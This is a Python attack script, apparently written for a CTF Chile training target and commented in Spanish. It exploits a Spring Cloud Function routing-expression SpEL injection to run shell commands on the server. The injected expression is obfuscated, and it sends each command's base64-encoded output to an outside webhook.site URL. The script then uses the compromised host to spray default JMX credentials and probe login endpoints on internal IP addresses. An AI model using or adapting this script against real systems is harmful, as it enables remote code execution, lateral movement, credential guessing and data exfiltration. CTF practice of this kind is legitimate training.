#!/usr/bin/env python3
"""
CTF Chile - Intentar autenticación en APIs usando credenciales JMX
"""
import requests
import time
import base64
import json

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

# Crear webhook
print("[*] Intentando autenticación en APIs...")
UUID = requests.post("https://webhook.site/token", timeout=10).json()["uuid"]
WH = "https://webhook.site/" + UUID
print(f"    Webhook: https://webhook.site/#!/{UUID}")

def probe(tag, cmd):
    shell = f"{cmd} | base64 -w0 | xargs -I X curl -s '{WH}/{tag}?d=X'"
    p = f'T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("exe"+"c",new String[]{{}}.getClass()).invoke(T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("getRunt"+"ime").invoke(null),new String[]{{"/bin/sh","-c","{shell}"}}).waitFor()'
    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": p,
            "Content-Type": "text/plain",
        }, data="x", timeout=20)
        print(f"    [+] {tag:40} http {r.status_code}")
    except Exception as e:
        print(f"    [!] {tag} error: {e}")

print("[*] FASE 1: Probar autenticación HTTP Basic...")

# Credenciales JMX para probar
creds = [
    ("monitorRole", "QED"),
    ("controlRole", "R&D"),
    ("monitor", "QED"),
    ("control", "R&D")
]

hosts = ["10.160.209.1", "10.109.220.1"]

# Probar HTTP Basic Auth con las credenciales
for host in hosts:
    for user, password in creds:
        host_safe = host.replace(".", "_")
        user_safe = user.replace("Role", "")

        # Basic Auth para /openapi.json
        probe(f"basic_openapi_{host_safe}_{user_safe}", f"curl -s -u {user}:{password} http://{host}:8000/openapi.json 2>/dev/null")

        # Basic Auth para root
        probe(f"basic_root_{host_safe}_{user_safe}", f"curl -s -u {user}:{password} http://{host}:8000/ 2>/dev/null")

print("[*] FASE 2: Probar autenticación con Bearer token...")

# Probar Bearer token authentication
for host in hosts:
    for user, password in creds:
        host_safe = host.replace(".", "_")
        user_safe = user.replace("Role", "")

        # Bearer token usando la password como token
        probe(f"bearer_{host_safe}_{user_safe}", f"curl -s -H 'Authorization: Bearer {password}' http://{host}:8000/openapi.json 2>/dev/null")

print("[*] FASE 3: Probar headers personalizados...")

# Probar con headers específicos que podrían ser utilizados por JMX
custom_headers = [
    ("X-JMX-User", "X-JMX-Password"),
    ("X-Auth-User", "X-Auth-Pass"),
    ("X-Monitor-Role", "X-Monitor-Pass"),
    ("X-Control-Role", "X-Control-Pass")
]

for host in hosts:
    for user, password in creds:
        host_safe = host.replace(".", "_")
        user_safe = user.replace("Role", "")

        for user_header, pass_header in custom_headers[:2]:  # Solo las primeras 2
            probe(f"custom_{host_safe}_{user_safe}_{user_header.replace('-', '_').lower()}", f"curl -s -H '{user_header}: {user}' -H '{pass_header}: {password}' http://{host}:8000/openapi.json 2>/dev/null")

print("[*] FASE 4: Probar endpoints alternativos...")

# Probar endpoints que podrían no requerir autenticación
alt_endpoints = [
    "/api", "/v1", "/api/v1", "/public",
    "/health", "/status", "/ping", "/version"
]

for host in hosts:
    host_safe = host.replace(".", "_")
    for endpoint in alt_endpoints:
        endpoint_safe = endpoint.replace("/", "_")
        probe(f"alt_{host_safe}{endpoint_safe}", f"curl -s http://{host}:8000{endpoint} 2>/dev/null")

print("[*] FASE 5: Probar POST con credenciales JSON...")

# Probar POST authentication endpoints
auth_endpoints = ["/login", "/auth", "/token", "/authenticate"]

for host in hosts:
    for user, password in creds[:2]:  # Solo las primeras 2 credenciales
        host_safe = host.replace(".", "_")
        user_safe = user.replace("Role", "")

        for endpoint in auth_endpoints:
            endpoint_safe = endpoint.replace("/", "_")
            auth_json = json.dumps({"username": user, "password": password}).replace('"', '\\"')
            probe(f"post_auth_{host_safe}{endpoint_safe}_{user_safe}", f"curl -s -X POST -H 'Content-Type: application/json' -d '{auth_json}' http://{host}:8000{endpoint} 2>/dev/null")

print("[*] FASE 6: Probar métodos HTTP alternativos...")

# Probar métodos HTTP que podrían revelar información
for host in hosts:
    host_safe = host.replace(".", "_")
    # TRACE method
    probe(f"trace_{host_safe}", f"curl -s -X TRACE http://{host}:8000/ 2>/dev/null")
    # PATCH method
    probe(f"patch_{host_safe}", f"curl -s -X PATCH http://{host}:8000/ 2>/dev/null")

time.sleep(25)

# Recoger y analizar respuestas
print("\n[*] Analizando intentos de autenticación...")
r = requests.get(f"https://webhook.site/token/{UUID}/requests?sorting=newest&per_page=50", timeout=20)
data = r.json().get("data", [])

successful_auths = []
api_discoveries = []
error_messages = []
flags_found = []

for req in data:
    url = req.get("url", "")
    path = url.split(f"webhook.site/{UUID}/")[-1].split("?")[0]
    q = req.get("query") or {}
    raw = q.get("d")
    if isinstance(raw, list):
        raw = raw[0] if raw else ""

    print("=" * 70)
    print(f"🔍 TAG: {path}")

    if raw:
        try:
            decoded = base64.b64decode(raw).decode("utf-8", "replace")
            print(decoded)

            # Detectar autenticación exitosa
            if not ('{"detail":"Not Found"}' in decoded or "404" in decoded):
                if len(decoded.strip()) > 30:
                    successful_auths.append((path, decoded))
                    print("🔑 POSIBLE AUTENTICACIÓN EXITOSA")

            # Detectar respuestas de API válidas
            if any(keyword in decoded.lower() for keyword in ["openapi", "paths", "components", "swagger"]):
                api_discoveries.append((path, decoded))
                print("📚 API DESCUBIERTO")

            # Detectar mensajes de error útiles
            if any(keyword in decoded.lower() for keyword in ["unauthorized", "forbidden", "invalid", "error"]):
                if len(decoded.strip()) > 10 and len(decoded.strip()) < 200:
                    error_messages.append((path, decoded))
                    print("⚠️ MENSAJE DE ERROR")

            # Buscar flags
            if "ctfchile{" in decoded.lower():
                flags_found.append((path, decoded))
                print(f"\n🚩🚩🚩 FLAG ENCONTRADO! 🚩🚩🚩")

        except Exception as e:
            print(f"(decode error) {raw[:100]}...")
    else:
        print("(sin payload)")

# Resumen final
print("\n" + "="*70)
print("📊 RESUMEN DE AUTENTICACIÓN")
print("="*70)

if successful_auths:
    print(f"🔑 AUTENTICACIONES EXITOSAS: {len(successful_auths)}")
    for path, content in successful_auths:
        print(f"    ✅ {path}")
        print(f"       {content[:150]}...")

if api_discoveries:
    print(f"\n📚 APIs DESCUBIERTAS: {len(api_discoveries)}")
    for path, content in api_discoveries:
        print(f"    📄 {path}")
        print(f"       {content[:150]}...")

if error_messages:
    print(f"\n⚠️ MENSAJES DE ERROR: {len(error_messages)}")
    for path, content in error_messages:
        print(f"    - {path}: {content}")

if flags_found:
    print(f"\n🚩 FLAGS ENCONTRADOS: {len(flags_found)}")
    for path, flag in flags_found:
        print(f"    🎯 {path}: {flag}")
else:
    print("\n💭 No se encontraron flags aún. Continuar con exploración específica.")

print(f"\n🔗 Webhook: https://webhook.site/#!/{UUID}")